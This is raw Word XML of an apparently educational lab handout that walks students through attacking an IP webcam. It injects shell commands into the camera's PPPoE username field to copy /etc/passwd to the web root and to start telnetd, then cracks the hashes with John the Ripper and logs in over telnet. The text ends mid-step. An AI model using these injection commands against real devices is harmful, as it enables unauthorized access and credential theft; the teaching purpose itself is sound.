          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6667896F" wp14:editId="71E1F15C">
            <wp:extent cx="2258568" cy="1472184"/>
            <wp:effectExtent l="38100" t="38100" r="104140" b="901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47218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37A66" w14:textId="77777777" w:rsidR="006903F5" w:rsidRPr="006903F5" w:rsidRDefault="0019359F" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Go to</w:t>
      </w:r>
      <w:r w:rsidR="00CB51E7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CB51E7" w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>System</w:t>
      </w:r>
      <w:r w:rsidR="00EC4BF8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC4BF8" w:rsidRPr="00EC4BF8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00CB51E7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124713E7" w14:textId="68FAF8F1" w:rsidR="006903F5" w:rsidRDefault="006903F5" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click Cancel on the following screen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2D19E0" w14:textId="0046AEE6" w:rsidR="006903F5" w:rsidRPr="006903F5" w:rsidRDefault="006903F5" w:rsidP="006903F5">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32B05F3C" wp14:editId="25ADB415">
            <wp:extent cx="2295144" cy="1508760"/>
            <wp:effectExtent l="38100" t="38100" r="86360" b="914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50876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9D8EE" w14:textId="395F70C9" w:rsidR="00D1493D" w:rsidRPr="00D1493D" w:rsidRDefault="00D1493D" w:rsidP="00D1493D">
      <w:r>
        <w:t>We are going to reset to factory defaults before we do anything else. Just in case the last person forgot to do this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFFF907" w14:textId="6794B111" w:rsidR="0019359F" w:rsidRDefault="00CB51E7" w:rsidP="000A1BD7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Restore factory default settings:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Reset</w:t>
      </w:r>
      <w:r w:rsidR="00730B8F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D013BD6" w14:textId="14DADEDE" w:rsidR="00CB51E7" w:rsidRDefault="00CB51E7" w:rsidP="000A1BD7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a minute or so</w:t>
      </w:r>
      <w:r w:rsidR="009864FA">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009864FA">
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>can the network again to find the camera IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136166B9" w14:textId="4D92FC8B" w:rsidR="001C3640" w:rsidRDefault="001C3640" w:rsidP="000A1BD7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Go to</w:t>
      </w:r>
      <w:r w:rsidR="00985EC9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00985EC9" w:rsidRPr="00317966">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Advanced</w:t>
      </w:r>
      <w:r w:rsidR="00593FBB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00593FBB" w:rsidRPr="00593FBB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00985EC9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00317966">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r w:rsidR="00593FBB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00593FBB">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> enable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00317966">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>PPPoE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1FEF7D57" w14:textId="080C1EDA" w:rsidR="002E671B" w:rsidRDefault="001064FD" w:rsidP="002E671B">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc197157051"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Bash Injection Web Cam</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="76D2B0E2" w14:textId="3D2718CE" w:rsidR="003F7A3D" w:rsidRDefault="003F7A3D" w:rsidP="003F7A3D">
      <w:r w:rsidRPr="003F7A3D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NOTE:</w:t>
      </w:r>
      <w:r w:rsidRPr="003F7A3D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B8750E">
        <w:t>We are going to use a</w:t>
      </w:r>
      <w:r w:rsidRPr="003F7A3D">
        <w:t xml:space="preserve"> bash injection attack.</w:t>
      </w:r>
      <w:r w:rsidR="00B15D8D">
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r w:rsidR="00B15D8D" w:rsidRPr="00B15D8D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:r w:rsidR="00B15D8D">
        <w:t xml:space="preserve"> initiates a bash shell for the following command. This command will copy the hashes of the passwd storage to a local web server where we can retrieve and crack the hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A190BC" w14:textId="4B26BD49" w:rsidR="00F679F0" w:rsidRDefault="001010BD" w:rsidP="0052674C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidR="000F468B">
        <w:t xml:space="preserve">or copy and paste </w:t>
      </w:r>
      <w:r>
        <w:t>the following bash command in the P</w:t>
      </w:r>
      <w:r w:rsidR="00985EC9">
        <w:t>PPOE username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1B" w14:paraId="5122E90C" w14:textId="77777777" w:rsidTr="002E671B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="410E0000" w14:textId="0F06D373" w:rsidR="002E671B" w:rsidRDefault="002E671B" w:rsidP="002E671B">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00F679F0">
              <w:t>$(cat /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00F679F0">
              <w:t>etc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00F679F0">
              <w:t>/passwd &gt; /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00F679F0">
              <w:t>usr</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00F679F0">
              <w:t>/local/www/hash.txt)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33DEAF27" w14:textId="06173038" w:rsidR="001010BD" w:rsidRDefault="001010BD" w:rsidP="0052674C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Insert any character in the password field.</w:t>
      </w:r>
      <w:r w:rsidR="00984458">
        <w:t xml:space="preserve"> Save the settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16073291" w14:textId="77777777" w:rsidR="00A754D7" w:rsidRDefault="00BA307C" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In your Web Browser</w:t>
      </w:r>
      <w:r w:rsidR="000D2683">
        <w:t>, g</w:t>
      </w:r>
      <w:r w:rsidR="00632618">
        <w:t xml:space="preserve">o to web </w:t>
      </w:r>
      <w:r w:rsidR="005D66E8">
        <w:t>addres</w:t>
      </w:r>
      <w:r w:rsidR="00E61D94">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00A754D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4D7" w14:paraId="5350F666" w14:textId="77777777" w:rsidTr="00A754D7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="6F6A1267" w14:textId="2E00F5B9" w:rsidR="00A754D7" w:rsidRDefault="00A754D7" w:rsidP="00A754D7">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00A754D7">
              <w:t xml:space="preserve">{camera </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A754D7">
              <w:t>ip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A754D7">
              <w:t xml:space="preserve"> address}/hash.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22FB522D" w14:textId="3272566E" w:rsidR="00586033" w:rsidRPr="00B36727" w:rsidRDefault="00586033" w:rsidP="0051008A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0051008A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>hash.txt</w:t>
      </w:r>
      <w:r w:rsidRPr="00586033">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051008A">
        <w:t>contains</w:t>
      </w:r>
      <w:r w:rsidRPr="00586033">
        <w:t xml:space="preserve"> password file hash</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidRPr="00586033">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA7D9B4" w14:textId="37A0ECEF" w:rsidR="00B36727" w:rsidRPr="00B36727" w:rsidRDefault="00B36727" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B36727">
        <w:t xml:space="preserve">Select and </w:t>
      </w:r>
      <w:r w:rsidR="00BB5048">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00B36727">
        <w:t>opy the text displayed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65297F1E" w14:textId="657F31F9" w:rsidR="006D5F7B" w:rsidRDefault="008F3897" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r w:rsidR="007D6204">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>nano</w:t>
      </w:r>
      <w:r w:rsidR="007D6204" w:rsidRPr="007D6204">
        <w:t xml:space="preserve"> or another text editor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidR="00B36727">
        <w:t xml:space="preserve">Paste the text and </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="006D5F7B">
        <w:t xml:space="preserve">ave the file </w:t>
      </w:r>
      <w:r w:rsidR="006D5F7B" w:rsidRPr="00C563B3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>hash.txt</w:t>
      </w:r>
      <w:r w:rsidR="006D5F7B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007965C9">
        <w:t>as a plain text file</w:t>
      </w:r>
      <w:r w:rsidR="00D96371">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FE93CB" w14:textId="77777777" w:rsidR="00984458" w:rsidRDefault="006D5F7B" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Start a terminal</w:t>
      </w:r>
      <w:r w:rsidR="00984458">
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
      <w:r w:rsidR="00632618">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58789548" w14:textId="031CFB4F" w:rsidR="00632618" w:rsidRDefault="00984458" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run John the Ripper </w:t>
      </w:r>
      <w:r w:rsidR="00B8743A">
        <w:t xml:space="preserve">with the rockyou.txt word list </w:t>
      </w:r>
      <w:r w:rsidR="00B36727">
        <w:t xml:space="preserve">in a terminal session </w:t>
      </w:r>
      <w:r>
        <w:t>to crack the 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44B1" w14:paraId="161720D9" w14:textId="77777777" w:rsidTr="00E244B1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="07A9BF28" w14:textId="5CFBB3EB" w:rsidR="00E244B1" w:rsidRPr="00E244B1" w:rsidRDefault="00E244B1" w:rsidP="00E244B1">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="007D7932">
              <w:t xml:space="preserve">john </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">--wordlist=Downloads/rockyou.txt </w:t>
            </w:r>
            <w:r w:rsidRPr="007D7932">
              <w:t>hash.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F452387" w14:textId="312539C7" w:rsidR="00FA7668" w:rsidRDefault="005F58D4" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>To show the username and password</w:t>
      </w:r>
      <w:r w:rsidR="005E7A6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A64" w14:paraId="4E9D9C46" w14:textId="77777777" w:rsidTr="005E7A64">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="62D98A5A" w14:textId="6392FE6D" w:rsidR="005E7A64" w:rsidRDefault="005E7A64" w:rsidP="005E7A64">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="005F58D4">
              <w:t xml:space="preserve">john </w:t>
            </w:r>
            <w:r>
              <w:t>--</w:t>
            </w:r>
            <w:r w:rsidRPr="005F58D4">
              <w:t>show hash.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="549CC217" w14:textId="1CFC8426" w:rsidR="005F58D4" w:rsidRPr="005F58D4" w:rsidRDefault="005F58D4" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="005F58D4">
        <w:t>You should see the username and password at the beginning of the file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2503D063" w14:textId="6C1A1FF8" w:rsidR="00220E25" w:rsidRPr="00220E25" w:rsidRDefault="00220E25" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot</w:t>
      </w:r>
      <w:r w:rsidR="003A383B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> showing the cracked username and password</w:t>
      </w:r>
      <w:r w:rsidR="00AA3C2B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> at the Kali Linux command prompt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-681586957"/>
        <w:placeholder>
          <w:docPart w:val="28D5D3AD07FC4E568F12AA5A104B9C5E"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="DefaultParagraphFont"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="1E5E28A7" w14:textId="02ED298B" w:rsidR="00317637" w:rsidRDefault="00317637" w:rsidP="0031763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5F5F66AD" w14:textId="570CC61E" w:rsidR="008A6FBA" w:rsidRDefault="008A6FBA" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Delete the hash.txt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6BB7" w14:paraId="19DE5D97" w14:textId="77777777" w:rsidTr="007F6BB7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="4D56E6BA" w14:textId="3901BCAB" w:rsidR="007F6BB7" w:rsidRDefault="007F6BB7" w:rsidP="007F6BB7">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="000B5AE1">
              <w:t>rm hash.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E94F2FB" w14:textId="33E1AE91" w:rsidR="00AA36A6" w:rsidRDefault="00AA36A6" w:rsidP="00F679F0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA36A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to confirm</w:t>
      </w:r>
      <w:r w:rsidR="00C66A96">
        <w:t xml:space="preserve"> file deletion</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4A5B79" w14:textId="77777777" w:rsidR="00AD0187" w:rsidRDefault="00AD0187" w:rsidP="001E5828">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc197157052"/>
      <w:r>
        <w:t xml:space="preserve">Hack the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WebCam</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="48A3EB67" w14:textId="4E6B15BB" w:rsidR="00632618" w:rsidRDefault="00782AA1" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the Web Browser </w:t>
      </w:r>
      <w:r w:rsidR="004B26F5">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">go back to </w:t>
      </w:r>
      <w:r w:rsidR="004B26F5">
        <w:t>the webcam web interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538A9BF8" w14:textId="099202DB" w:rsidR="004B26F5" w:rsidRDefault="004B26F5" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:r w:rsidRPr="00CC6048">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Advanced</w:t>
      </w:r>
      <w:r w:rsidR="00F1424D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F1424D">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CC6048">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r w:rsidR="00CC6048">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078E52DD" w14:textId="66969F02" w:rsidR="0090483C" w:rsidRDefault="004B26F5" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type the following bash command in the PPPOE username field.</w:t>
      </w:r>
      <w:r w:rsidR="00CD27F9">
        <w:t xml:space="preserve"> Make sure there is at least one character in the password field.</w:t>
      </w:r>
      <w:r w:rsidR="00AE1FD9">
        <w:br/>
      </w:r>
      <w:r w:rsidR="000B107E">
        <w:t>This command will start the webcam telnet server</w:t>
      </w:r>
      <w:r w:rsidR="00CC6048">
        <w:t>, the telnet daemon</w:t>
      </w:r>
      <w:r w:rsidR="000B107E">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="004F6CB2">
        <w:t xml:space="preserve"> (daemon is the name for service in Linux.)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22D" w14:paraId="317C827B" w14:textId="77777777" w:rsidTr="00C3022D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="0237CB3D" w14:textId="4396C496" w:rsidR="00C3022D" w:rsidRDefault="00C3022D" w:rsidP="00C3022D">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00483118">
              <w:t>$(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483118">
              <w:t>telnetd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483118">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A0D8C9F" w14:textId="7629EC5D" w:rsidR="00632618" w:rsidRDefault="00214A90" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00214A90">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>From a terminal session</w:t>
      </w:r>
      <w:r w:rsidRPr="00214A90">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00632618" w:rsidRPr="00F3668A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>telnet</w:t>
      </w:r>
      <w:r w:rsidR="00632618">
        <w:t xml:space="preserve"> into the camera</w:t>
      </w:r>
      <w:r w:rsidR="00281871">
        <w:t>’s IP</w:t>
      </w:r>
      <w:r w:rsidR="00013538">
        <w:t xml:space="preserve"> address</w:t>
      </w:r>
      <w:r w:rsidR="00E33A1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22D" w14:paraId="64EC58EF" w14:textId="77777777" w:rsidTr="00C3022D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF1DD" w:themeFill="accent3" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="6F5682FF" w14:textId="533762BC" w:rsidR="00C3022D" w:rsidRDefault="00C3022D" w:rsidP="00C3022D">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00BE57D6">
              <w:t xml:space="preserve">telnet </w:t>
            </w:r>
            <w:r w:rsidR="007E5C67">
              <w:t>{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidR="007E5C67">
              <w:t>ipa</w:t>
            </w:r>
            <w:r>
              <w:t>ddress</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidR="007E5C67">
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17A4CD5C" w14:textId="6C36FF02" w:rsidR="00E33A1B" w:rsidRDefault="00E33A1B" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login using the credentials we just cracked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D8B3A2" w14:textId="77777777" w:rsidR="00852AC7" w:rsidRDefault="00852AC7" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidRPr="00F3668A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to verify the file system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38704211" w14:textId="77777777" w:rsidR="002531EE" w:rsidRDefault="002531EE" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002531EE">
